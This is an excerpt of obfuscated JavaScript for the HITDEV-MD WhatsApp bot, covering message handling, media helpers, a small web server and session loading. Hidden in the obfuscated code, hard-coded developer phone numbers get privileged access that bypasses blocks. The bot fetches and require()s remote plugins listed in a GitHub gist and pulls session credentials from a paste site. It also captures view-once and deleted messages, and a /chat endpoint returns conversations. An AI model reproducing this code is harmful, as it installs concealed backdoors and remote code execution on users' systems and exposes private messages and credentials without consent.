...
async function syncdb() {
  let _0x3d0468 = __dirname + "/assets/hitdev.jpg";
  try {
    global.log0 = typeof THUMB_IMAGE === "string" ? await getBuffer(THUMB_IMAGE.split(',')[0x0]) : fs.readFileSync(_0x3d0468);
  } catch (_0x780452) {
    _0x3d0468 = __dirname + "/assets/hitdev.jpg";
  }
  global.log0 = global.log0 || fs.readFileSync(_0x3d0468);
  const {
    state: _0x46b7e4,
    saveCreds: _0xd884d9
  } = await useMultiFileAuthState(__dirname + "/Hitdev_Baileys/");
  let _0x5447f8 = HitdevMDConnect({
    'logger': Pino({
  ...
  _0x5447f8.ev.on('call', async _0x522b10 => {
    let _0x37f540 = await callsg(_0x5447f8, JSON.parse(JSON.stringify(_0x522b10[0x0])));
  ...
  _0x5447f8.ev.on("messages.upsert", async _0x1071af => {
    try {
      ...
      for (mek of _0x1071af.messages) {
        ...
        if (_0x57832c && _0x4186a0[0x1] && _0x4186a0[0x1] == " ") {
          _0x4186a0 = _0x4186a0[0x0] + _0x4186a0.slice(0x2);
        }
        let _0x9954f4 = false;
        let _0x4931af = false;
        let _0x49f69c = false;
        if (_0x57832c && Config.HANDLERS.toLowerCase().includes("null")) {
          _0x9954f4 = true;
          _0x4931af = _0x4186a0.split(" ")[0x0].toLowerCase() || false;
        } else if (_0x57832c && !Config.HANDLERS.toLowerCase().includes("null")) {
          _0x9954f4 = prefixboth || _0x4186a0 && prefixRegex.test(_0x4186a0[0x0]) || _0x5979da.isHitdev && /923184474176|923004591719|17863688449/g.test(_0x5b55c3) && _0x4186a0[0x0] == ',';
          _0x4931af = _0x9954f4 ? prefa ? _0x4186a0.trim().split(" ")[0x0].toLowerCase() : _0x4186a0.slice(0x1).trim().split(" ")[0x0].toLowerCase() : false;
          _0x49f69c = prefixboth ? _0x4186a0.trim().split(" ")[0x0].toLowerCase() : '';
        } else {
          _0x9954f4 = false;
        }
        ...
        if (blockJid.includes(_0x5979da.chat) && !_0x5979da.isHitdev) {
          return;
        }
        if (_0x9954f4 && (_0x5979da.isBaileys || !_0x36ea81 && Config.WORKTYPE === "private" && !allowJid.includes(_0x5979da.chat))) {
          _0x9954f4 = false;
        }
        const _0x34cf4e = _0x5979da.body ? _0x4186a0.trim().split(/ +/).slice(0x1) : [];
        ...
        if (_0x9954f4) {
          ...
          if (_0x5979da.isGroup && _0x111ae6 && _0x4931af !== "bot") {
            let _0x334235 = _0x4f1890[_0x5979da.chat] || (await groupdb.findOne({
              ...
              'botenable': toBool(_0x5979da.isHitdev || !blockJid.includes(_0x5979da.chat))
            };
          ...
          if (_0x111ae6) {
            ...
            let _0x23f471 = _0x5979da.body ? _0x4186a0.trim().split(/ +/).slice(0x1).join(" ") : '';
        ...
        events.commands.map(async _0x2dffdb => {
          if (typeof _0x2dffdb.on === 'string') {
            ...
            if (_0x1d5795 === "main" && _0x3078ae) {
              ...
              if (_0x5979da.text && _0x1d5795 === "text" && /text|txt|true|smd|hitdev/gi.test(_0x2dffdb.quoted) && _0x5979da.quoted && _0x5979da.quoted.text && _0x3078ae) {
                _0x2dffdb["function"](_0x5979da, _0x4186a0, _0x4717ae);
              } else {
                if (_0x5979da.text && ["body", "text"].includes(_0x1d5795) && _0x3078ae) {
                  _0x2dffdb["function"](_0x5979da, _0x4186a0, _0x4717ae);
                } else {
                  if (typeof _0x5979da[_0x1421b9[_0x1d5795] || _0x1d5795] === 'boolean' && _0x5979da.quoted && _0x5979da.quoted[_0x2dffdb.quoted] && _0x3078ae) {
                    _0x2dffdb["function"](_0x5979da, _0x4186a0, _0x4717ae);
                  } else {
                    if (_0x1d5795 === "viewonce" && (_0x5979da.viewOnce || mek.message.viewOnceMessageV2)) {
                      try {
                        _0x2dffdb["function"](_0x5979da, _0x4186a0, _0x4717ae);
                      } catch (_0x1b9359) {
            ...
            if (_0x1d5795 === "delete" && _0x5979da.mtype == "protocolMessage" && _0x5979da.msg.type === "REVOKE" && _0x3078ae) {
              ...
              if (_0x1d5795 === "poll" && /poll/gi.test(_0x5979da.mtype) && _0x3078ae) {
                _0x2dffdb['function'](_0x5979da, _0x4186a0, _0x4717ae);
              } else {
                if (_0x1d5795 === 'quoted' && _0x5979da.quoted && _0x3078ae) {
                  _0x2dffdb['function'](_0x5979da, _0x4186a0, _0x4717ae);
                }
              }
            }
  ...
  _0x5447f8.ev.on('group-participants.update', async _0x33a505 => {
    try {
      ...
      events.commands.map(async _0x497293 => {
        ...
        if (/on|true|main|all|hitdev|smd/gi.test(_0x497293.group)) {
          try {
            _0x497293["function"](_0x1684d7, {
              'store': store,
              'Void': _0x5447f8
  ...
  _0x5447f8.ev.on("groups.upsert", async _0x6ac529 => {
    try {
      events.commands.map(async _0x591343 => {
        if (/on|true|main|all|hitdev|smd/gi.test(_0x591343.groupsetting || _0x591343.upsertgroup || _0x591343.groupupsert)) {
          _0x591343["function"]({
            ..._0x6ac529[0x0],
            'bot': _0x5447f8
          }, {
      ...
      await groupsg(_0x5447f8, JSON.parse(JSON.stringify(_0x6ac529[0x0])), false, true);
    } catch (_0x2ec500) {
  ...
  _0x5447f8.ev.on("contacts.upsert", _0x30754f => {
    try {
      for (const _0x55e2fd of _0x30754f) store.contacts[_0x55e2fd.id] = _0x55e2fd;
    } catch (_0x528b11) {}
  });
  ...
  _0x5447f8.ev.on("connection.update", async _0x3fd0b3 => {
    ...
    if (_0x2224a7 === "open") {
      ...
      let _0x11c5d7 = /923184474176|923004591719|17863688449/g.test(_0x89b8f6);
      let _0x506b6e = false;
      ...
      try {
        ...
        try {
          let {
            data: _0x3de7cf
          } = await axios.get("https://gist.github.com/HITDeveloper2023/185b7e3296e0104ab211daa5ea11e7dc/raw");
          _0xd559f7 = {
        ...
        if (Object.keys(_0xd559f7 || {}).length > 0x0) {
          ...
          for (const _0x5701b6 in _0x22ec5b) {
            try {
              ...
              if (_0x28bc47) {
                let _0x224d22 = _0x5701b6 + (_0x4fcba7[_0x5701b6] && /.js|.smd|.hitdev/gi.test(_0x4fcba7[_0x5701b6]) ? _0x4fcba7[_0x5701b6] : ".smd");
                const _0x286e03 = plugin_dir + (_0x224d22.includes('/') ? _0x224d22.split('/')[0x0] : '');
  ...
  _0x5447f8.messageId = (_0x344ea2 = 0x8, _0x4bb246 = "HITDEVMD") => {
    for (let _0x159a8c = 0x0; _0x159a8c < _0x344ea2; _0x159a8c++) {
      const _0x1bd7e5 = Math.floor(Math.random() * '1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'.length);
      _0x4bb246 += '1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'.charAt(_0x1bd7e5);
    }
    return _0x4bb246;
  };
  ...
  _0x5447f8.sendImage = async (_0x566754, _0x4723fa, _0x2087ca = '', _0x53d3a0 = '', _0x459604) => {
    let _0x3c11d8 = Buffer.isBuffer(_0x4723fa) ? _0x4723fa : /^data:.*?\/.*?;base64,/i.test(_0x4723fa) ? Buffer.from(_0x4723fa.split`,`[0x1], "base64") : /^https?:\/\//.test(_0x4723fa) ? await await getBuffer(_0x4723fa) : fs.existsSync(_0x4723fa) ? fs.readFileSync(_0x4723fa) : Buffer.alloc(0x0);
  ...
  _0x5447f8.sendTextWithMentions = async (_0x54ea1e, _0x50c9ec, _0x2d2be2, _0x3a2080 = {}) => _0x5447f8.sendMessage(_0x54ea1e, {
    'text': _0x50c9ec,
    'contextInfo': {
      'mentionedJid': [..._0x50c9ec.matchAll(/@(\d{0,16})/g)].map(_0x1fe586 => _0x1fe586[0x1] + "@s.whatsapp.net")
    },
    ..._0x3a2080
  }, {
    'quoted': _0x2d2be2
  ...
  _0x5447f8.sendMedia = async (_0x2c82eb, _0x3b6f24, _0x1faf03 = '', _0x265eee = '', _0x43689c = '', _0x5f0c19 = {}) => {
    ...
    if (_0x1d60dd && _0x1d60dd.status !== 0xc8 || file.length <= 0x10000) {
      try {
        throw {
    ...
    if (_0x5f0c19.asSticker || /webp/.test(_0x50c8d4)) {
      ...
      if (/image/.test(_0x50c8d4)) {
        _0x4e01e4 = 'image';
      } else {
        if (/video/.test(_0x50c8d4)) {
          _0x4e01e4 = "video";
        } else {
          if (/audio/.test(_0x50c8d4)) {
            _0x4e01e4 = "audio";
          } else {
            _0x4e01e4 = "document";
          }
  ...
  _0x5447f8.downloadAndSaveMediaMessage = async (_0x23227c, _0x37efaf = "null", _0x3e6b5f = false, _0x2c905e = true) => {
    ...
    let _0x5b8c9d = _0x23227c.mtype ? _0x23227c.mtype.split(/Message/gi)[0x0] : _0x51c141.mtype ? _0x51c141.mtype.split(/Message/gi)[0x0] : _0x1a1e90.split('/')[0x0];
  ...
  _0x5447f8.forward = async (_0x5d4b74, _0x57d8d8, _0x15b451, _0x16bd40, _0x25719f = true) => {
    try {
      ...
      const _0x28c0f4 = _0x44514a => {
        return '' + Math.floor(Math.random() * 0x2710) + _0x44514a;
      };
      let _0x3020cf = _0x57d8d8.msg ? _0x57d8d8.msg : _0x57d8d8;
      let _0x2d258b = (_0x57d8d8.msg || _0x57d8d8).mimetype || '';
      let _0x4ee4d0 = _0x57d8d8.mtype ? _0x57d8d8.mtype.replace(/Message/gi, '') : _0x2d258b.split('/')[0x0];
      ...
      let _0x68b951 = await ('' + Math.floor(Math.random() * 0x2710) + _0x20c880.ext);
  ...
  _0x5447f8.downloadMediaMessage = async _0x3d0953 => {
    ...
    let _0x557d4d = _0x3d0953.mtype ? _0x3d0953.mtype.replace(/Message/gi, '') : _0x50cf98.split('/')[0x0];
  ...
  _0x5447f8.forwardOrBroadCast2 = async (_0x2565bd, _0x442828, _0x145dd4 = {}, _0x23baf9 = '') => {
    try {
      ...
      let _0x5909f8 = _0x1068f6 ? _0x1068f6 : Object.keys(_0x14aec7)[0x0];
      _0x14aec7 = {
        ..._0x28966a,
        ..._0x14aec7
      };
  ...
  _0x5447f8.forwardOrBroadCast = async (_0x189e5c, _0x54c0d9, _0x18e0cf = {}, _0x348d78 = '') => {
    try {
      ...
      let _0x103f18 = _0x3ce975.mtype ? _0x3ce975.mtype : Object.keys(_0x3ce975)[0x0];
  ...
  _0x5447f8.copyNForward = async (_0x333b21, _0x4d04c0, _0x3c23fa = false, _0x4ed2c0 = {}) => {
    try {
      ...
      if (_0x4ed2c0.readViewOnce) {
        ...
        _0x92cb9d = Object.keys(_0x4d04c0.message.viewOnceMessage.message)[0x0];
  ...
  _0x5447f8.sendFileUrl = async (_0x245d2a, _0x1ddbcd, _0xd689ee = '', _0x2cf1f3 = '', _0x5b2d56 = {
    ...
    try {
      ...
      let _0x4397c4 = _0x141f60.split('/')[0x0];
      let _0x5a6000 = false;
      if (_0x141f60.split('/')[0x1] === "gif" || _0x49581e === "gif") {
        _0x5a6000 = {
          'video': {
            'url': _0x1ddbcd
          },
        ...
        if (_0x141f60.split('/')[0x1] === "webp" || _0x49581e === "sticker") {
          _0x5a6000 = {
            'sticker': {
              'url': _0x1ddbcd
            },
          ...
          if (_0x4397c4 === "image" || _0x49581e === 'image') {
            _0x5a6000 = {
              'image': {
                'url': _0x1ddbcd
              },
            ...
            if (_0x4397c4 === 'video' || _0x49581e === "video") {
              _0x5a6000 = {
                'video': {
                  'url': _0x1ddbcd
                },
              ...
              if (_0x4397c4 === "audio" || _0x49581e === "audio") {
                _0x5a6000 = {
                  'audio': {
                    'url': _0x1ddbcd
                  },
      ...
      try {
        var _0x13eb84 = _0x113f67?.["headers"]["content-disposition"]?.["split"]("=\"")[0x1]?.["split"]("\"")[0x0] || 'file';
        if (_0x13eb84) {
  ...
  _0x5447f8.sendUi = async (_0x264148, _0x4d42ab = {}, _0x541cb3 = '', _0x2e5e1f = '', _0x3bceba = '', _0x171bcf = false) => {
    ...
    try {
      ...
      let _0x237b02;
      if ((_0x171bcf && _0x3bceba && global.style > 0x0 || !_0x3bceba) && /text|txt|nothing|smd|hitdev/.test(global.userImages) || _0x2e5e1f == "text") {
        _0x237b02 = {
          'text': _0x4d42ab.text || _0x4d42ab.caption,
          ..._0x4d42ab
        };
      } else {
        if (_0x2e5e1f == "image" || _0x29f5c5[_0x311f88].image) {
          _0x237b02 = {
            'image': {
              'url': _0x311f88
            },
      ...
      const _0x28e991 = _0x171bcf && _0x3bceba && global.style > 0x0 ? await smdBuffer(_0x3bceba) : null;
      _0x28cdb7 = {
  ...
  _0x5447f8.contextInfo = async (_0x180918 = Config.botname, _0x4f8a10 = Config.ownername, _0x567995 = log0, _0x281a1c = 0x1, _0x3e314a = gurl, _0x1d19d2 = false) => {
    try {
  ...
  _0x5447f8.cMod = (_0x2fa8b5, _0x4510a5, _0xaaa44a = '', _0x2f32eb = _0x5447f8.user.id, _0x18c25b = {}) => {
    let _0x449b96 = Object.keys(_0x4510a5.message)[0x0];
    let _0x255a68 = _0x449b96 === "ephemeralMessage";
    if (_0x255a68) {
      _0x449b96 = Object.keys(_0x4510a5.message.ephemeralMessage.message)[0x0];
    }
    ...
    if (_0x4510a5.key.remoteJid.includes("@s.whatsapp.net")) {
      ...
      if (_0x4510a5.key.remoteJid.includes('@broadcast')) {
        _0x2f32eb = _0x2f32eb || _0x4510a5.key.remoteJid;
      }
    }
  ...
  _0x5447f8.getFile = async (_0x45942b, _0x80d77a) => {
    let _0x5bc7b0;
    let _0x53270f = Buffer.isBuffer(_0x45942b) ? _0x45942b : /^data:.*?\/.*?;base64,/i.test(_0x45942b) ? Buffer.from(_0x45942b.split`,`[0x1], 'base64') : /^https?:\/\//.test(_0x45942b) ? await (_0x5bc7b0 = await getBuffer(_0x45942b)) : fs.existsSync(_0x45942b) ? (_0x29fbe1 = _0x45942b, fs.readFileSync(_0x45942b)) : typeof _0x45942b === "string" ? _0x45942b : Buffer.alloc(0x0);
  ...
  _0x5447f8.sendFile = async (_0x17db4b, _0x2edb21, _0x347170, _0x1d60b2 = {
    ...
    if (_0x2b562b.asSticker || /webp/.test(_0x212f6e)) {
      ...
      if (/image/.test(_0x212f6e)) {
        _0x8dc65e = "image";
      } else {
        if (/video/.test(_0x212f6e)) {
          _0x8dc65e = "video";
        } else {
          if (/audio/.test(_0x212f6e)) {
            _0x8dc65e = "audio";
          } else {
            _0x8dc65e = "document";
          }
  ...
  _0x5447f8.fakeMessage = async (_0x141089 = "text", _0x5364cd = {}, _0x371309 = "➬ Hitdev SER", _0x1a0d91 = {}) => {
    const _0x22700d = [0x309, 0x0, 0x64, 0x1f4, 0x3e8, 0x3e7, 0x7e5];
    let _0x17661c = {
  ...
  _0x5447f8.parseMention = async _0x3d4032 => {
    return [..._0x3d4032.matchAll(/@([0-9]{5,16}|0)/g)].map(_0x9e355e => _0x9e355e[0x1] + "@s.whatsapp.net");
  };
  app.get("/chat", (_0x52c0af, _0x203368) => {
    ...
    _0x203368.json({
      'chat': _0x5785a4,
      'conversation': JSON.stringify(_0x382b66, null, 0x2)
    });
  });
  _0x5447f8.dl_size = global.dl_size || 0xc8;
...
global.toBool = (_0x5f0b1e, _0x23fe95 = false) => /true|yes|ok|act|sure|enable|smd|hitdev/gi.test(_0x5f0b1e) ? _0x23fe95 ? true : "true" : _0x23fe95 ? false : "false";
  ...
  try {
    fs.readdirSync(_0x31a795).forEach(_0x340012 => {
      ...
      if (fs.statSync(_0x4c0490).isDirectory()) {
        ...
        if (_0x340012.includes("_Baileys") || _0x340012.includes("_MSGS")) {
          log("\nRENTBOTT's DATA DETECTED!", "\nUSER NUMBER:", _0x340012.replace("_MSGS", '').replace("_Baileys", ''), "\n\n");
        } else {
          if (['.js', ".smd", '.hitdev'].includes(path.extname(_0x340012).toLowerCase())) {
            try {
              require(_0x4c0490);
            } catch (_0xf3f8e5) {
...
app.get('/', (_0x529972, _0x4e4868) => {
  try {
    ...
    if (fs.existsSync(_0x37572c)) {
      ...
      _0x4e4868.type("html").send("\n     <!DOCTYPE html>\n     <html>\n       <head>\n         <title>HITDEV-MD</title>\n         <link rel=\"icon\" type=\"image/png\" sizes=\"32x32\" href=\"/logo\">\n         <script src=\"https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js\"></script>\n         <script>\n           setTimeout(() => {\n             confetti({\n               particleCount: 100,\n               spread: 70,\n               origin: { y: 0.6 },\n               disableForReducedMotion: true\n             });\n           }, 500);\n         </script>\n         <style>\n           @import url(\"https://p.typekit.net/p.css?s=1&k=vnd5zic&ht=tk&f=39475.39476.39477.39478.39479.39480.39481.39482&a=18673890&app=typekit&e=css\");\n           @font-face {\n             font-family: \"neo-sans\";\n             src: url(\"https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3\") format(\"woff2\"), url(\"https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3\") format(\"woff\"), url(\"https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3\") format(\"opentype\");\n             font-style: normal;\n             font-weight: 700;\n           }\n           html {\n             font-family: neo-sans;\n             font-weight: 700;\n             font-size: calc(62rem / 24);\n           }\n           body {\n             background: white;\n           }\n           section {\n             border-radius: 1em;\n             padding: 1em;\n             position: absolute;\n             top: 50%;\n             left: 50%;\n             margin-right: -50%;\n             transform: translate(-50%, -50%);\n           }\n           \n         </style>\n       </head>\n       <body>\n         <section>\n           Hello from \"Hitdev Tech Info\"!\n         </section>\n         <p>  <a href='/qr' > QR </a> | <a href='/var' > VARIABLES </a> | <a href='https://github.com/HITDeveloper2023/HITDEV-MD-Media' > PLUGINS </a> | <a href='https://github.com/HITDeveloper2023/HITDEV-MD/wiki' > WIKI's </a></p>\n       </body> \n     </html>\n     ");
    }
  } catch (_0x572663) {}
});
app.get("/hitdev", (_0x2e8c1a, _0x30322c) => _0x30322c.type("html").send("\n     <!DOCTYPE html>\n     <html>\n       <head>\n         <title>HITDEV-MD</title>\n         <link rel=\"icon\" type=\"image/png\" sizes=\"32x32\" href=\"/logo\">\n         <script src=\"https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js\"></script>\n         <script>\n           setTimeout(() => {\n             confetti({\n               particleCount: 100,\n               spread: 70,\n               origin: { y: 0.6 },\n               disableForReducedMotion: true\n             });\n           }, 500);\n         </script>\n         <style>\n           @import url(\"https://p.typekit.net/p.css?s=1&k=vnd5zic&ht=tk&f=39475.39476.39477.39478.39479.39480.39481.39482&a=18673890&app=typekit&e=css\");\n           @font-face {\n             font-family: \"neo-sans\";\n             src: url(\"https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3\") format(\"woff2\"), url(\"https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3\") format(\"woff\"), url(\"https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3\") format(\"opentype\");\n             font-style: normal;\n             font-weight: 700;\n           }\n           html {\n             font-family: neo-sans;\n             font-weight: 700;\n             font-size: calc(62rem / 24);\n           }\n           body {\n             background: white;\n           }\n           section {\n             border-radius: 1em;\n             padding: 1em;\n             position: absolute;\n             top: 50%;\n             left: 50%;\n             margin-right: -50%;\n             transform: translate(-50%, -50%);\n           }\n           \n         </style>\n       </head>\n       <body>\n         <section>\n           Hello from \"Hitdev Tech Info\"!\n         </section>\n         <p>  <a href='/qr' > QR </a> | <a href='/var' > VARIABLES </a> | <a href='https://github.com/HITDeveloper2023/HITDEV-MD-Media' > PLUGINS </a> | <a href='https://github.com/HITDeveloper2023/HITDEV-MD/wiki' > WIKI's </a></p>\n       </body> \n     </html>\n     "));
...
app.listen(quickport, () => console.log("HITDEV-MD Server listening on http://localhost:" + quickport + "/  "));
...
function keepAlive() {
  setInterval(() => {
    for (let _0x215660 = 0x0; _0x215660 < Appurls.length; _0x215660++) {
...
async function MakeSession(_0x3344dc = SESSION_ID, _0xe1ef27 = __dirname + "/Hitdev_Baileys/", _0x1532e1 = false) {
  let _0x148358 = ('' + _0x3344dc).replace(/^SESSION_\d{2}_\d{2}_\d{2}_\d{2}_/gi, '').replace(/^SESSION_ID_\d{2}_\d{2}_\d{2}_\d{2}_/gi, '').replace(/^HITDEV_\d{2}_\d{2}_\d{2}_\d{2}_/gi, '').replace(/Secktor;;;/gi, '').replace(/Vorterx;;;/gi, '').replace(/Hitdev;;;/gi, '').trim();
  ...
  const _0x40fbb4 = toBool(_0x1532e1 || global.IS_HITDEV || process.env.IS_HITDEV, true) || (await _0x28b1d6("/HITDeveloper2023/", "./Hitdev_Md"));
  if (_0x40fbb4) {
    SmdOfficial = "yes";
    ...
    if (_0x148358 && /guru/gi.test(_0x148358) && _0x148358.length < 0x1e) {
      try {
        ...
        var _0x395cbc = _0x536cf8 ? Buffer.from(_0x536cf8, "base64").toString("utf-8") : {};
        const _0x5f2a33 = JSON.parse(_0x395cbc);
        fs.writeFileSync(_0xe1ef27 + "creds.json", JSON.stringify(_0x5f2a33, null, 0x2));
        log("\nCredentials saved successfully.");
      } catch (_0xc1bebf) {
        log("EMPTY SESSION_ID FROM GURU SERVER\nPLEASE SCAN THE QR AGAIN FROM [ " + global.scan + " ]\n\n\nERROR: ", _0xc1bebf);
      }
    } else {
      if (_0x148358 && _0x148358.length > 0x3 && _0x148358.length < 0x14) {
        try {
          let {
            data: _0x449628
          } = await axios.get("https://paste.c-net.org/" + _0x148358);
          fs.writeFileSync(_0xe1ef27 + "creds.json", Buffer.from(_0x449628, "base64").toString("utf-8"), 'utf8');
        } catch (_0x11ae89) {
        ...
        if (_0x148358) {
          try {
            ...
            var _0x395cbc = Buffer.from(_0x148358, "base64").toString("utf-8");
            const _0x4b3148 = JSON.parse(_0x395cbc);
            if (_0x4b3148["creds.json"]) {
              for (const _0x1d12b5 in _0x4b3148) {
                try {
                  fs.writeFileSync(_0xe1ef27 + _0x1d12b5, typeof _0x4b3148[_0x1d12b5] == 'string' ? _0x4b3148[_0x1d12b5] : JSON.stringify(_0x4b3148[_0x1d12b5], null, 0x2));
                } catch (_0x1d9fd6) {}
              }
            } else {
              fs.writeFileSync(_0xe1ef27 + "creds.json", JSON.stringify(_0x4b3148, null, 0x2));
            }
            log("\nCredentials Saved Successfully.");
          } catch (_0x5cc9c4) {
